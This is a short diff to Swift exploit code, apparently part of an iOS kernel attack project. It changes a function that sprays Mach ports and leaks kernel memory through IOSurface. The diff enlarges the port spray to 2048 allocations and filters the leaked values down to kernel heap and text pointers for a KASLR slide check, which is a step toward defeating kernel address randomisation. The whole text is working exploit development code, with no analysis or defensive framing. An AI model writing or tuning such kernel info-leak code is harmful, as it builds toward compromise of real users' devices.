@@ -1773,7 +1773,7 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         // When IOSurface grabs physical pages for its backing store, it may pick up
         // pages that held Mach port kernel structures — those become our residue.
         var sprayPorts: [mach_port_t] = []
-        for _ in 0..<64 {
+        for _ in 0..<2048 {
             var p: mach_port_t = 0
             if mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS {
                 sprayPorts.append(p)
@@ -2001,7 +2001,12 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 else                                                    { cat = "KGAP"  }
                 let globalOff = chunkByteOffset + qw*8
                 step("  prt[+0x\(String(globalOff,radix:16))]=0x\(String(v,radix:16)) [\(cat)]")
-                currentPairs.append((offset: globalOff, val: v))
+                // Only track KHEAP and KTEXT offsets — KMMIO values are Metal GPU ring-buffer
+                // addresses that change between boots by page-aligned amounts, producing false
+                // positives in the KASLR slide check. KGAP values are not kernel pointers either.
+                if cat == "KHEAP" || cat == "KTEXT" || cat == "KTEXTD" {
+                    currentPairs.append((offset: globalOff, val: v))
+                }
                 seenThisRun.insert(v)
             }
         }
